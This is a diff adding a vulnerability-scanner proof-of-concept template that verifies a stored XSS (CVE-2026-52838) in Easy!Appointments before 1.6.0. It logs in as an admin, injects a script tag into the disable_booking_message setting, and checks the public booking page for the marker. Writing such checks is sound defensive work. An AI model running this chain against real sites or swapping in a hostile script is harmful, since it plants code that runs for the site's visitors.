@@ -1,0 +1,63 @@
+[info]
+author = "ave"
+description = "验证 Easy!Appointments 1.6.0 之前版本中 disable_booking_message 存储型 XSS 漏洞。管理员通过后台设置页面注入恶意 HTML/JS 至 disable_booking_message 字段，当启用预约禁用模式后，未认证用户访问公共预约页面时触发执行。"
+id = "POC-AVE-2026-0756"
+name = "Easy!Appointments disable_booking_message Stored XSS PoC"
+severity = "low"
+tags = ["cve-2026-52838"]
+vuln_id = [
+    "CVE-2026-52838",
+    "AVE-2026-0756",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php/backend_api/ajax_login"
+protocol = "http"
+
+[poc.requests.body]
+content = "username={{admin_username}}&password={{admin_password}}"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SUCCESS"]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php/backend_api/ajax_save_settings"
+protocol = "http"
+
+[poc.requests.body]
+content = "settings[disable_booking]=1&settings[disable_booking_message]=<script>alert('XSS_TEST')</script>"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["SUCCESS"]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/index.php/book"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["XSS_TEST"]
